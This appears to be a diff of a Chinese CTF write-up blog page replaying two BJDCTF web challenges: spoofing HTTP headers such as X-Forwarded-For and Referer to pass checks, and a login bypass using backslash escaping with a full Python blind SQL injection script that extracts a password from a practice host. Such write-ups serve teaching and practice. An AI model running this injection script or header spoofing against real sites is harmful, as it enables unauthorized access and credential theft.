@@ -205,30 +205,30 @@
             <p>今天复现了一下BJDCTF</p>
 <h2 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h2><p>首先进入页面</p>
 <p>是一个登录页面，以为是注入，随便输入了一下发现进去了，抓个包</p>
-<p><img src="/2022/03/16/%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80/1.png" alt="1"></p>
+<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/1.png" alt="1"></p>
 <p>发现藏了一个网页，访问一下</p>
 <p>第一次访问的时候网页显示发生了一个错误，刷新一下就可以发现下一步的提示（如果不刷新抓包的话没有在cookie中没有time）</p>
-<p><img src="/2022/03/16/%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80/2.png" alt="1"></p>
+<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/2.png" alt="1"></p>
 <p>抓个包</p>
-<p><img src="/2022/03/16/%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80/3.png" alt="1"></p>
+<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/3.png" alt="1"></p>
 <p>拿去解码一下发现是今天的日期，加九十九年，进入下一个提示</p>
-<p><img src="/2022/03/16/%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80/4.png" alt="1"></p>
+<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/4.png" alt="1"></p>
 <p>需要我们的ip是<code>localhost</code>自然而然想到<code>X-Forwarded-For</code></p>
-<p><img src="/2022/03/16/%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80/5.png" alt="1"></p>
+<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/5.png" alt="1"></p>
 <p>另一种方式，可以用client-ip也一样是伪造ip</p>
 <p>后面是需要伪造</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">who come from gem-love.com</span><br><span class="line">Referer: gem-love.com</span><br><span class="line">Sorry, this site is only optimized for browsers that run on Commodo 64</span><br><span class="line">User-Agent: Commodore 64</span><br><span class="line">Sorry, this site is only optimized for those whose email is root@gem-love.com</span><br><span class="line">From: root@gem-love.com</span><br><span class="line">Sorry, this site is only optimized for those who use the http proxy of y1ng.vip. if you dont have the proxy, pls contact us to buy, ￥100/Month</span><br><span class="line">Via: y1ng.vip</span><br></pre></td></tr></table></figure>
 
 <p>最后可以在这里看到flag的base64编码（如果用hackbar添加头的话需要抓包，源码不显示）</p>
-<p><img src="/2022/03/16/%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80/6.png" alt="1"></p>
+<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/6.png" alt="1"></p>
 <h2 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h2><p>进入页面是一个登录框，结合题目名称，应该就是在这里注入了，fuzz发现单引号双引号全被过滤了</p>
 <p>可以用的符号是</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`!@#$%^*()_+[]&#123;&#125;\|:,./&lt;&gt;?</span><br></pre></td></tr></table></figure>
 
 <p>可以发现反斜杠还有#没有被过滤，再找找别的，发现再robots,txt中藏了一个文件进去访问发现</p>
-<p><img src="/2022/03/16/%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80/7.png" alt="1"></p>
+<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/7.png" alt="1"></p>
 <p>他给出了我们在登陆框的查询语句，审计一下，单引号被过滤了所以username那边无法闭合，但是反斜杠没有被过滤，可以再最后添加一个反斜杠转义后面的单引号，然后可以用＃注释掉后面的单引号构造另一种闭合，也就是我们可以再password这添加我们的查询语句，测试的时候发现or没有被过滤，而为真的时候页面会回显</p>
-<p><img src="/2022/03/16/%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80/8.png" alt="1"></p>
+<p><img src="/2022/03/16/BJDCTF%E5%A4%8D%E7%8E%B0/8.png" alt="1"></p>
 <p>显而易见这就是一个盲注了，构造payload脚本：（因为查找过于慢，照着之前写的finalsql注入的脚本改的）</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://b49b6771-4b40-4bd5-8959-4bea5ae5fd40.node4.buuoj.cn:81/index.php&quot;</span><br><span class="line"></span><br><span class="line">data = &#123;&quot;username&quot;: &quot;admin\\&quot;, &quot;password&quot;: &quot;&quot;&#125;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while (True):</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line"></span><br><span class="line">    while (head &lt; tail):</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line"></span><br><span class="line">        # payload = &quot;or/**/if(ascii(substr(username,%d,1))&gt;%d,1,0)#&quot;%(i,mid)</span><br><span class="line">        payload = &quot;or/**/if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot; % (i, mid)</span><br><span class="line"></span><br><span class="line">        data[&#x27;password&#x27;] = payload</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">        if &quot;stronger&quot; in r.text:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    last = result</span><br><span class="line"></span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
 
@@ -243,7 +243,7 @@
         <li>Post author：paixiaoxing</li>
         <li>Create time：2022-03-16 20:42:15</li>
         <li>
-            Post link：https://keep.xpoet.cn/2022/03/16/假猪套天下第一/
+            Post link：https://keep.xpoet.cn/2022/03/16/BJDCTF复现/
         </li>
         <li>
             Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
